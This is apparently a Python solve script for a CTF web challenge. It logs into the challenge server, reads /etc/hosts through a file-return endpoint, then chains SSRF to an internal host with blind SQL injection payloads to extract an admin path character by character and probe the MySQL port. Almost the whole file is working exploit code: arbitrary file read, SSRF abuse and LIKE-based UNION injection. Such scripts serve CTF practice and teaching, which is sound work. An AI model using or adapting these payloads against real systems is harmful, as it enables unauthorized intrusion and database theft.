from re import L
import requests
import signal
import sys
import os
import string
import codecs
import threading

from urllib.parse import quote, quote_plus

TARGET_URL = 'http://web.challenge.bi0s.in:6006'

class NameThread (threading.Thread):
   def __init__(self, threadID, l, i, s):
      threading.Thread.__init__(self)
      self.threadID = threadID
      self.i = i
      self.l = l
      self.s = s
      self.ch = ''
   def run(self):
      self.ch=getNameChar(self.i,self.l,self.s)

class PathThread (threading.Thread):
   def __init__(self, threadID, l, i, s):
      threading.Thread.__init__(self)
      self.threadID = threadID
      self.i = i
      self.l = l
      self.s = s
      self.ch = ''
   def run(self):
      self.ch=getPathChar(self.i,self.l,self.s)

def signal_handler(sig, frame):
    print('Exiting...')
    sys.exit(0)

def login():
    s = requests.Session()
    data={  "username":"navy2",
            "password":"navy2",
            "submit":"Login"    }
    r = s.post(TARGET_URL+'/login',data=data)
    return s

def get_file(s,file):
    r=s.get(TARGET_URL+'/return-files?f='+file)
    return(r.text)

def ssrf(s,url):
    data={"url":url}
    r = s.post(TARGET_URL+'/dev_test',data=data)
    #print(r.text)
    return r.text

def getNameLen(s):
    l=0
    path=''
    while True:
        l+=1
        path=path+'25'
        payload_path="path,name from adminfo where name like 0x{} and name not like 0x64756d62 Union select password".format(path)
        print(payload_path)
        path_test='http://192.168.48.2:80?part1=%25%7C%7C%25271&part2='+quote_plus(payload_path)
        success=ssrf(s,path_test)
        if success=="Not":
            print("success")
            break
        
    print(l)
    return l

def getNameChar(i,l,s):
    for c in string.printable:
        a=c
        if c=='%' or c=='_':
            continue
        c=c.encode('UTF-8')
        tmp=codecs.encode(c, "hex").decode("UTF-8")
        tmp="5f"*i+tmp+"5f"*(l-i-1)
        payload_path="path,name from adminfo where name like binary 0x{} and name not like 0x64756d62 Union select password".format(tmp)
        #print(payload_path)
        path_test='http://192.168.48.2:80?part1=%25%7C%7C%25271&part2='+quote_plus(payload_path)
        success=ssrf(s,path_test)
        if success=="Not":
            path=tmp
            #print("success")
            return a
        #print(tmp)


def getPathLen(s,host):
    l=0
    path=''
    while True:
        l+=1
        path=path+'5f'
        payload_path="path,name from adminfo where path like 0x{} and name like 0x41646d696e Union select password".format(path)
        #print(payload_path)
        path_test='http://'+host+'?part1=%25%7C%7C%25271&part2='+quote_plus(payload_path)
        success=ssrf(s,path_test)
        if success=="Not":
            print("success")
            break
        print(l)
        
    print(l)
    return l

def getPathChar(i,l,s):
    for c in string.printable:
        if c=='%' or c=='_':
            continue
        c=c.encode('UTF-8')
        tmp=codecs.encode(c, "hex").decode("UTF-8")
        tmp="5f"*i+tmp+"5f"*(l-i-1)
        payload_path="path,name from adminfo where path like binary 0x{} and name like 0x41646d696e Union select password".format(tmp)
        print(payload_path)
        path_test='http://192.168.48.2:80?part1=%25%7C%7C%25271&part2='+quote_plus(payload_path)
        success=ssrf(s,path_test)
        if success=="Not":
            path=tmp
            print("success")
            return c
        print(tmp)

def getPath(s,host):
    CURSOR_UP_ONE = '\033[F' 
    ERASE_LINE = '\033[K' 
    path=""
    true_path=""
    flag=0
    while True:
        flag=0
        for c in string.printable:
            if c=='%' or c=='_':
                continue
            a=c
            c=c.encode('UTF-8')
            tmp=path+codecs.encode(c, "hex").decode("UTF-8")
            payload_path="path,name from adminfo where path like binary 0x2f{}25 and name like 0x41646d696e Union select password".format(tmp)
            sys.stdout.write(payload_path+"\r")
            sys.stdout.flush()
            sys.stdout.write(ERASE_LINE)    
            path_test='http://'+host+'?part1=%25%7C%7C%25271&part2='+quote_plus(payload_path)
            success=ssrf(s,path_test)
            if success=="Not":
                path=tmp
                flag=1
                true_path=true_path+a
                if len(true_path)==len('6205198aab5'):
                    return '/'+true_path
                print(true_path)
                #print(path)
                break
            #print(tmp)
        if(flag==0):
            break
    
    print(true_path)
    return true_path

def main():
    s=login()
    query='test'
    host=get_file(s,'/etc/hosts')
    host=host.split('\n')[-2].split('\t')[1]
    path=getPath(s,host)
    print(path)
    #print(path)
    print(ssrf(s,'http://'+host+':3306'+path))
    exit(0)

main()